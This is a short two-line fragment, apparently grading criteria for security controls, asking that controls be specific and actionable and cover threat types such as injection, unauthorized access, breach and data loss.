Controls are specific and actionable (not vague)
Controls address different threat types (injection, unauthorized access, breach, data loss)
